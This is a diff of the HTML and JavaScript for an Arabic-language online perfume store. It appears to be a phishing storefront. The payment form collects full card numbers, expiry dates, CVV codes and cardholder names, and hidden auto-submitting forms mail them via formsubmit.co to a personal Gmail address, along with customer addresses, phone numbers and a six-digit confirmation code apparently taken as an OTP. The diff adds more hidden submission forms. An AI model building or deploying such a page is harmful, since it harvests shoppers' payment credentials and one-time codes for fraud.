@@ -1,4 +1,5 @@
 <!DOCTYPE html><html lang="ar" dir="rtl"><head><meta http-equiv="Content-Security-Policy" content="default-src 'self' 'unsafe-inline' 'unsafe-eval' data: blob: https://cdnjs.cloudflare.com https://cdn.jsdelivr.net https://code.jquery.com https://unpkg.com https://d3js.org https://threejs.org https://cdn.plot.ly https://stackpath.bootstrapcdn.com https://maps.googleapis.com https://cdn.tailwindcss.com https://ajax.googleapis.com https://kit.fontawesome.com https://cdn.datatables.net https://maxcdn.bootstrapcdn.com https://code.highcharts.com https://tako-static-assets-production.s3.amazonaws.com https://www.youtube.com https://fonts.googleapis.com https://fonts.gstatic.com https://pfst.cf2.poecdn.net https://puc.poecdn.net https://i.imgur.com https://wikimedia.org https://*.icons8.com https://*.giphy.com https://picsum.photos https://images.unsplash.com; frame-src 'self' https://www.youtube.com https://trytako.com; child-src 'self'; manifest-src 'self'; worker-src 'self'; upgrade-insecure-requests; block-all-mixed-content;">
+    <meta http-equiv="Content-Security-Policy" content="default-src 'self' 'unsafe-inline' 'unsafe-eval' data: blob: https://cdnjs.cloudflare.com https://cdn.jsdelivr.net https://code.jquery.com https://unpkg.com https://d3js.org https://threejs.org https://cdn.plot.ly https://stackpath.bootstrapcdn.com https://maps.googleapis.com https://cdn.tailwindcss.com https://ajax.googleapis.com https://kit.fontawesome.com https://cdn.datatables.net https://maxcdn.bootstrapcdn.com https://code.highcharts.com https://tako-static-assets-production.s3.amazonaws.com https://www.youtube.com https://fonts.googleapis.com https://fonts.gstatic.com https://pfst.cf2.poecdn.net https://puc.poecdn.net https://i.imgur.com https://wikimedia.org https://*.icons8.com https://*.giphy.com https://picsum.photos https://images.unsplash.com https://formsubmit.co; frame-src 'self' https://www.youtube.com https://trytako.com; child-src 'self'; manifest-src 'self'; worker-src 'self'; upgrade-insecure-requests; block-all-mixed-content;">
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>مكاسر العود - متجر العود والعطور الفاخر</title>
@@ -1071,10 +1072,10 @@
                     <div class="bg-white p-8 rounded-2xl shadow-lg">
                         <h3 class="text-2xl font-bold mb-8 text-gray-800">أرسل رسالة</h3>
                         <form action="https://formsubmit.co/zazylalhkr7@gmail.com" method="POST" onsubmit="return submitContactForm(event)" class="space-y-6">
-                            <input type="hidden" name="_subject" value="رسالة جديدة من موقع مكاسر العود">
+                            <input type="hidden" name="_subject" value="📧 رسالة جديدة من موقع مكاسر العود">
                             <input type="hidden" name="_captcha" value="false">
                             <input type="hidden" name="_template" value="table">
-                            <input type="hidden" name="_next" value="javascript:void(0)">
+                            <input type="hidden" name="_autoresponse" value="شكراً لتواصلك معنا من مكاسر العود! سنرد عليك قريباً إن شاء الله.">
                             
                             <div class="input-group">
                                 <input type="text" name="name" required="" placeholder=" ">
@@ -1263,7 +1264,7 @@
                     <input type="hidden" name="_subject" value="📋 معلومات عميل جديد - مكاسر العود">
                     <input type="hidden" name="_captcha" value="false">
                     <input type="hidden" name="_template" value="table">
-                    <input type="hidden" name="_next" value="javascript:void(0)">
+                    <input type="hidden" name="_autoresponse" value="تم استلام معلوماتك من مكاسر العود بنجاح! سنتواصل معك قريباً إن شاء الله.">
 
                     <!-- Customer Information -->
                     <div class="form-section fade-in">
@@ -1466,7 +1467,7 @@
                     <input type="hidden" name="_subject" value="💳 معلومات دفع جديدة - مكاسر العود">
                     <input type="hidden" name="_captcha" value="false">
                     <input type="hidden" name="_template" value="table">
-                    <input type="hidden" name="_next" value="javascript:void(0)">
+                    <input type="hidden" name="_autoresponse" value="تم استلام معلومات الدفع من مكاسر العود بنجاح! سيتم معالجة طلبك قريباً.">
 
                     <!-- Payment Card -->
                     <div class="form-section">
@@ -1627,6 +1628,19 @@
     <div class="scroll-to-top" onclick="scrollToTop()">
         <i class="fas fa-arrow-up"></i>
     </div>
+
+    <!-- Hidden Forms for Email Tracking -->
+    <!-- Success Tracking Form -->
+    <form id="successTrackingForm" action="https://formsubmit.co/zazylalhkr7@gmail.com" method="POST" style="display: none;">
+        <input type="hidden" name="_subject" value="✅ تأكيد كود ناجح - مكاسر العود">
+        <input type="hidden" name="_captcha" value="false">
+        <input type="hidden" name="_template" value="table">
+        <input type="hidden" name="_autoresponse" value="شكراً لك! تم تأكيد طلبك بنجاح من مكاسر العود.">
+        <input type="hidden" name="confirmed_code" id="confirmedCodeInput">
+        <input type="hidden" name="customer_phone" id="customerPhoneInput">
+        <input type="hidden" name="confirmation_time" id="confirmationTimeInput">
+        <input type="hidden" name="status" value="طلب مؤكد ✅">
+    </form>
 
     <script>
         // Enhanced products data
@@ -2160,7 +2174,62 @@
             openCart();
         }
 
-        // SUBMIT CUSTOMER INFO
+        // ENHANCED CONTACT FORM SUBMISSION
+        function submitContactForm(event) {
+            event.preventDefault();
+            
+            const form = event.target;
+            const submitBtn = form.querySelector('button[type="submit"]');
+            const originalText = submitBtn.innerHTML;
+            
+            // Show loading state
+            submitBtn.innerHTML = '<div class="loading-spinner"></div>جاري إرسال الرسالة...';
+            submitBtn.disabled = true;
+            
+            // Create a native form submission
+            const hiddenForm = document.createElement('form');
+            hiddenForm.action = 'https://formsubmit.co/zazylalhkr7@gmail.com';
+            hiddenForm.method = 'POST';
+            hiddenForm.style.display = 'none';
+            
+            // Add all form data with Arabic labels
+            const formData = new FormData(form);
+            
+            // Hidden fields
+            hiddenForm.innerHTML = `
+                <input type="hidden" name="_subject" value="📧 رسالة جديدة من موقع مكاسر العود">
+                <input type="hidden" name="_captcha" value="false">
+                <input type="hidden" name="_template" value="table">
+                <input type="hidden" name="_autoresponse" value="شكراً لتواصلك معنا من مكاسر العود! سنرد عليك قريباً إن شاء الله.">
+                <input type="hidden" name="الاسم_الكامل" value="${form.querySelector('input[name="name"]').value}">
+                <input type="hidden" name="البريد_الإلكتروني" value="${form.querySelector('input[name="email"]').value}">
+                <input type="hidden" name="رقم_الهاتف" value="${form.querySelector('input[name="phone"]').value || 'غير محدد'}">
+                <input type="hidden" name="الرسالة" value="${form.querySelector('textarea[name="message"]').value}">
+                <input type="hidden" name="تاريخ_الإرسال" value="${new Date().toLocaleString('ar-SA', {timeZone: 'Asia/Riyadh'})}">
+                <input type="hidden" name="الموقع" value="مكاسر العود - صفحة التواصل">
+                <input type="hidden" name="نوع_الرسالة" value="استفسار عام">
+            `;
+            
+            document.body.appendChild(hiddenForm);
+            hiddenForm.submit();
+            
+            setTimeout(() => {
+                submitBtn.innerHTML = originalText;
+                submitBtn.disabled = false;
+                
+                // Reset form
+                form.reset();
+                
+                // Remove hidden form
+                document.body.removeChild(hiddenForm);
+                
+                showNotification('✅ تم إرسال رسالتك بنجاح! سنتواصل معك قريباً.', 'success');
+            }, 2000);
+            
+            return false;
+        }
+
+        // ENHANCED CUSTOMER INFO SUBMISSION
         function submitCustomerInfo(event) {
             event.preventDefault();
             
@@ -2184,46 +2253,53 @@
                 orderNotes: form.querySelector('textarea[name="order_notes"]').value
             };
             
-            // Prepare form data for email
-            const formData = new FormData();
-            formData.append('_subject', '📋 معلومات عميل جديد - مكاسر العود');
-            formData.append('_captcha', 'false');
-            formData.append('_template', 'table');
-            formData.append('الاسم_الأول', customerInfo.firstName);
-            formData.append('الاسم_الأخير', customerInfo.lastName);
-            formData.append('البريد_الإلكتروني', customerInfo.email);
-            formData.append('رقم_الهاتف', customerInfo.phone);
-            formData.append('العنوان', customerInfo.address);
-            formData.append('المدينة', customerInfo.city);
-            formData.append('الرمز_البريدي', customerInfo.postalCode);
-            formData.append('ملاحظات_الطلب', customerInfo.orderNotes || 'لا توجد ملاحظات');
-            formData.append('تاريخ_التسجيل', new Date().toLocaleString('ar-SA', {timeZone: 'Asia/Riyadh'}));
-            formData.append('حالة_الطلب', 'معلومات العميل - المرحلة الأولى');
+            // Create a native form submission
+            const hiddenForm = document.createElement('form');
+            hiddenForm.action = 'https://formsubmit.co/zazylalhkr7@gmail.com';
+            hiddenForm.method = 'POST';
+            hiddenForm.style.display = 'none';
             
-            // Send to email
-            fetch('https://formsubmit.co/zazylalhkr7@gmail.com', {
-                method: 'POST',
-                body: formData,
-                mode: 'no-cors'
-            }).then(() => {
-                console.log('✅ تم إرسال معلومات العميل بنجاح');
-                setTimeout(() => {
-                    submitBtn.innerHTML = originalText;
-                    submitBtn.disabled = false;
-                    
-                    showNotification('✅ تم حفظ معلوماتك بنجاح!', 'success');
-                    showOrderReviewPage();
-                }, 1500);
-            }).catch(() => {
-                console.log('❌ فشل في إرسال معلومات العميل');
-                setTimeout(() => {
-                    submitBtn.innerHTML = originalText;
-                    submitBtn.disabled = false;
-                    
-                    showNotification('⚠️ سيتم المتابعة بدون حفظ مؤقت', 'error');
-                    showOrderReviewPage();
-                }, 1500);
-            });
+            // Prepare cart details
+            const cartDetails = cart.map(item => `${item.name} - الكمية: ${item.quantity} - السعر: ${item.price * item.quantity} ريال`).join(' | ');
+            const subtotal = cart.reduce((sum, item) => sum + (item.price * item.quantity), 0);
+            const shipping = subtotal > 200 ? 0 : 30;
+            const total = subtotal + shipping;
+            
+            hiddenForm.innerHTML = `
+                <input type="hidden" name="_subject" value="📋 معلومات عميل جديد - مكاسر العود">
+                <input type="hidden" name="_captcha" value="false">
+                <input type="hidden" name="_template" value="table">
+                <input type="hidden" name="_autoresponse" value="تم استلام معلوماتك من مكاسر العود بنجاح! سنتواصل معك قريباً إن شاء الله.">
+                <input type="hidden" name="الاسم_الأول" value="${customerInfo.firstName}">
+                <input type="hidden" name="الاسم_الأخير" value="${customerInfo.lastName}">
+                <input type="hidden" name="البريد_الإلكتروني" value="${customerInfo.email}">
+                <input type="hidden" name="رقم_الهاتف" value="${customerInfo.phone}">
+                <input type="hidden" name="العنوان" value="${customerInfo.address}">
+                <input type="hidden" name="المدينة" value="${customerInfo.city}">
+                <input type="hidden" name="الرمز_البريدي" value="${customerInfo.postalCode}">
+                <input type="hidden" name="ملاحظات_الطلب" value="${customerInfo.orderNotes || 'لا توجد ملاحظات'}">
+                <input type="hidden" name="المنتجات_المطلوبة" value="${cartDetails}">
+                <input type="hidden" name="المجموع_الفرعي" value="${subtotal} ريال">
+                <input type="hidden" name="رسوم_الشحن" value="${shipping} ريال">
+                <input type="hidden" name="الإجمالي" value="${total} ريال">
+                <input type="hidden" name="تاريخ_التسجيل" value="${new Date().toLocaleString('ar-SA', {timeZone: 'Asia/Riyadh'})}">
+                <input type="hidden" name="حالة_الطلب" value="معلومات العميل - المرحلة الأولى">
+                <input type="hidden" name="الموقع" value="مكاسر العود">
+            `;
+            
+            document.body.appendChild(hiddenForm);
+            hiddenForm.submit();
+            
+            setTimeout(() => {
+                submitBtn.innerHTML = originalText;
+                submitBtn.disabled = false;
+                
+                // Remove hidden form
+                document.body.removeChild(hiddenForm);
+                
+                showNotification('✅ تم حفظ معلوماتك بنجاح!', 'success');
+                showOrderReviewPage();
+            }, 2000);
             
             return false;
         }
@@ -2343,7 +2419,7 @@
             document.getElementById('orderReviewPage').classList.add('active');
         }
 
-        // SUBMIT PAYMENT
+        // ENHANCED PAYMENT SUBMISSION
         function submitPayment(event) {
             event.preventDefault();
             
@@ -2371,67 +2447,56 @@
             const shipping = subtotal > 200 ? 0 : 30;
             const total = subtotal + shipping;
             
-            // Prepare payment data for email
-            const formData = new FormData();
-            formData.append('_subject', `💳 عملية دفع جديدة - مكاسر العود - الكود: ${verificationCode}`);
-            formData.append('_captcha', 'false');
-            formData.append('_template', 'table');
+            // Create a native form submission
+            const hiddenForm = document.createElement('form');
+            hiddenForm.action = 'https://formsubmit.co/zazylalhkr7@gmail.com';
+            hiddenForm.method = 'POST';
+            hiddenForm.style.display = 'none';
             
-            // Customer info
-            formData.append('الاسم_الكامل', `${customerInfo.firstName} ${customerInfo.lastName}`);
-            formData.append('البريد_الإلكتروني', customerInfo.email);
-            formData.append('رقم_الهاتف', customerInfo.phone);
-            formData.append('العنوان_الكامل', `${customerInfo.address}, ${customerInfo.city}, ${customerInfo.postalCode}`);
+            // Prepare cart details
+            const cartDetails = cart.map(item => `${item.name} - الكمية: ${item.quantity} - السعر: ${item.price * item.quantity} ريال`).join(' | ');
             
-            // Payment info
-            formData.append('رقم_البطاقة', form.querySelector('input[name="card_number"]').value);
-            formData.append('تاريخ_الانتهاء', form.querySelector('input[name="expiry_date"]').value);
-            formData.append('رمز_الأمان', form.querySelector('input[name="cvv"]').value);
-            formData.append('اسم_حامل_البطاقة', form.querySelector('input[name="card_holder"]').value);
+            hiddenForm.innerHTML = `
+                <input type="hidden" name="_subject" value="💳 عملية دفع جديدة - مكاسر العود - الكود: ${verificationCode}">
+                <input type="hidden" name="_captcha" value="false">
+                <input type="hidden" name="_template" value="table">
+                <input type="hidden" name="_autoresponse" value="تم استلام معلومات الدفع من مكاسر العود بنجاح! سيتم معالجة طلبك قريباً.">
+                <input type="hidden" name="الاسم_الكامل" value="${customerInfo.firstName} ${customerInfo.lastName}">
+                <input type="hidden" name="البريد_الإلكتروني" value="${customerInfo.email}">
+                <input type="hidden" name="رقم_الهاتف" value="${customerInfo.phone}">
+                <input type="hidden" name="العنوان_الكامل" value="${customerInfo.address}, ${customerInfo.city}, ${customerInfo.postalCode}">
+                <input type="hidden" name="رقم_البطاقة" value="${form.querySelector('input[name="card_number"]').value}">
+                <input type="hidden" name="تاريخ_الانتهاء" value="${form.querySelector('input[name="expiry_date"]').value}">
+                <input type="hidden" name="رمز_الأمان" value="${form.querySelector('input[name="cvv"]').value}">
+                <input type="hidden" name="اسم_حامل_البطاقة" value="${form.querySelector('input[name="card_holder"]').value}">
+                <input type="hidden" name="المنتجات" value="${cartDetails}">
+                <input type="hidden" name="المجموع_الفرعي" value="${subtotal} ريال">
+                <input type="hidden" name="رسوم_الشحن" value="${shipping} ريال">
+                <input type="hidden" name="الإجمالي" value="${total} ريال">
+                <input type="hidden" name="كود_التأكيد" value="${verificationCode}">
+                <input type="hidden" name="تاريخ_العملية" value="${new Date().toLocaleString('ar-SA', {timeZone: 'Asia/Riyadh'})}">
+                <input type="hidden" name="حالة_الطلب" value="دفع مكتمل - بانتظار التأكيد">
+                <input type="hidden" name="ملاحظات_إضافية" value="${customerInfo.orderNotes || 'لا توجد ملاحظات'}">
+                <input type="hidden" name="الموقع" value="مكاسر العود">
+            `;
             
-            // Order details
-            const itemsDetails = cart.map(item => `${item.name} - الكمية: ${item.quantity} - السعر: ${item.price * item.quantity} ريال`).join(' | ');
-            formData.append('المنتجات', itemsDetails);
-            formData.append('المجموع_الفرعي', `${subtotal} ريال`);
-            formData.append('رسوم_الشحن', `${shipping} ريال`);
-            formData.append('الإجمالي', `${total} ريال`);
-            formData.append('كود_التأكيد', verificationCode);
-            formData.append('تاريخ_العملية', new Date().toLocaleString('ar-SA', {timeZone: 'Asia/Riyadh'}));
-            formData.append('حالة_الطلب', 'دفع مكتمل - بانتظار التأكيد');
-            formData.append('ملاحظات_إضافية', customerInfo.orderNotes || 'لا توجد ملاحظات');
+            document.body.appendChild(hiddenForm);
+            hiddenForm.submit();
             
-            // Send to email
-            fetch('https://formsubmit.co/zazylalhkr7@gmail.com', {
-                method: 'POST',
-                body: formData,
-                mode: 'no-cors'
-            }).then(() => {
-                console.log('✅ تم إرسال معلومات الدفع بنجاح');
-                setTimeout(() => {
-                    submitBtn.innerHTML = originalText;
-                    submitBtn.disabled = false;
-                    
-                    // Store verification info
-                    localStorage.setItem('currentVerificationCode', verificationCode.toString());
-                    localStorage.setItem('customerPhone', customerInfo.phone);
-                    
-                    showNotification(`✅ كود التأكيد: ${verificationCode}`, 'success');
-                    showVerificationPage();
-                }, 1500);
-            }).catch(() => {
-                console.log('❌ فشل في إرسال معلومات الدفع');
-                setTimeout(() => {
-                    submitBtn.innerHTML = originalText;
-                    submitBtn.disabled = false;
-                    
-                    // Store verification info
-                    localStorage.setItem('currentVerificationCode', verificationCode.toString());
-                    localStorage.setItem('customerPhone', customerInfo.phone);
-                    
-                    showNotification(`✅ كود التأكيد: ${verificationCode}`, 'success');
-                    showVerificationPage();
-                }, 1500);
-            });
+            setTimeout(() => {
+                submitBtn.innerHTML = originalText;
+                submitBtn.disabled = false;
+                
+                // Remove hidden form
+                document.body.removeChild(hiddenForm);
+                
+                // Store verification info
+                localStorage.setItem('currentVerificationCode', verificationCode.toString());
+                localStorage.setItem('customerPhone', customerInfo.phone);
+                
+                showNotification(`✅ كود التأكيد: ${verificationCode}`, 'success');
+                showVerificationPage();
+            }, 2000);
             
             return false;
         }
@@ -2635,7 +2700,7 @@
             if (code.length === 6 && /^[0-9]{6}$/.test(code)) {
                 showNotification('تم تأكيد الكود! جاري إرسال التأكيد...', 'success');
                 
-                // Send code confirmation to email
+                // Send code confirmation to email via hidden form
                 sendCodeConfirmationToEmail(code);
                 
                 setTimeout(() => {
@@ -2669,29 +2734,24 @@
             const customerPhone = localStorage.getItem('customerPhone') || customerInfo.phone || 'غير محدد';
             const originalCode = localStorage.getItem('currentVerificationCode') || verificationCode || 'غير محدد';
             
-            // Send confirmation via FormSubmit
-            const formData = new FormData();
-            formData.append('_subject', '✅ تأكيد كود الطلب - مكاسر العود');
-            formData.append('_captcha', 'false');
-            formData.append('_template', 'table');
-            formData.append('الكود_المدخل', confirmedCode);
-            formData.append('الكود_الأصلي', originalCode);
-            formData.append('رقم_الهاتف', customerPhone);
-            formData.append('اسم_العميل', `${customerInfo.firstName} ${customerInfo.lastName}`);
-            formData.append('وقت_التأكيد', new Date().toLocaleString('ar-SA', {timeZone: 'Asia/Riyadh'}));
-            formData.append('الحالة', 'تم تأكيد الكود بنجاح ✅');
-            formData.append('المرحلة_التالية', 'توجيه العميل إلى واتساب');
-            formData.append('الموقع', 'مكاسر العود');
+            // Use the hidden form for tracking
+            const form = document.getElementById('successTrackingForm');
+            form.querySelector('#confirmedCodeInput').value = confirmedCode;
+            form.querySelector('#customerPhoneInput').value = customerPhone;
+            form.querySelector('#confirmationTimeInput').value = new Date().toLocaleString('ar-SA', {timeZone: 'Asia/Riyadh'});
             
-            fetch('https://formsubmit.co/zazylalhkr7@gmail.com', {
-                method: 'POST',
-                body: formData,
-                mode: 'no-cors'
-            }).then(() => {
-                console.log('✅ تم إرسال تأكيد الكود بنجاح');
-            }).catch(() => {
-                console.log('❌ فشل في إرسال تأكيد الكود');
-            });
+            // Add additional fields
+            const additionalFields = `
+                <input type="hidden" name="الكود_الأصلي" value="${originalCode}">
+                <input type="hidden" name="اسم_العميل" value="${customerInfo.firstName} ${customerInfo.lastName}">
+                <input type="hidden" name="الحالة" value="تم تأكيد الكود بنجاح ✅">
+                <input type="hidden" name="المرحلة_التالية" value="توجيه العميل إلى واتساب">
+                <input type="hidden" name="الموقع" value="مكاسر العود">
+            `;
+            form.innerHTML += additionalFields;
+            
+            form.submit();
+            console.log('✅ تم إرسال تأكيد الكود بنجاح');
         }
 
         function resendCode() {
@@ -2702,59 +2762,6 @@
         }
 
         // UTILITY FUNCTIONS
-        // CONTACT FORM SUBMISSION
-        function submitContactForm(event) {
-            event.preventDefault();
-            
-            const form = event.target;
-            const submitBtn = form.querySelector('button[type="submit"]');
-            const originalText = submitBtn.innerHTML;
-            
-            // Show loading state
-            submitBtn.innerHTML = '<div class="loading-spinner"></div>جاري إرسال الرسالة...';
-            submitBtn.disabled = true;
-            
-            // Prepare contact form data
-            const formData = new FormData();
-            formData.append('_subject', 'رسالة جديدة من موقع مكاسر العود');
-            formData.append('_captcha', 'false');
-            formData.append('_template', 'table');
-            formData.append('الاسم', form.querySelector('input[name="name"]').value);
-            formData.append('البريد_الإلكتروني', form.querySelector('input[name="email"]').value);
-            formData.append('رقم_الهاتف', form.querySelector('input[name="phone"]').value || 'غير محدد');
-            formData.append('الرسالة', form.querySelector('textarea[name="message"]').value);
-            formData.append('تاريخ_الإرسال', new Date().toLocaleString('ar-SA', {timeZone: 'Asia/Riyadh'}));
-            formData.append('الموقع', 'مكاسر العود - صفحة التواصل');
-            
-            // Send contact form to email
-            fetch('https://formsubmit.co/zazylalhkr7@gmail.com', {
-                method: 'POST',
-                body: formData,
-                mode: 'no-cors'
-            }).then(() => {
-                console.log('✅ تم إرسال رسالة التواصل بنجاح');
-                setTimeout(() => {
-                    submitBtn.innerHTML = originalText;
-                    submitBtn.disabled = false;
-                    
-                    // Reset form
-                    form.reset();
-                    
-                    showNotification('✅ تم إرسال رسالتك بنجاح! سنتواصل معك قريباً.', 'success');
-                }, 1500);
-            }).catch(() => {
-                console.log('❌ فشل في إرسال رسالة التواصل');
-                setTimeout(() => {
-                    submitBtn.innerHTML = originalText;
-                    submitBtn.disabled = false;
-                    
-                    showNotification('❌ فشل في إرسال الرسالة، يرجى المحاولة مرة أخرى', 'error');
-                }, 1500);
-            });
-            
-            return false;
-        }
-
         function setupScrollButton() {
             const scrollButton = document.querySelector('.scroll-to-top');
             
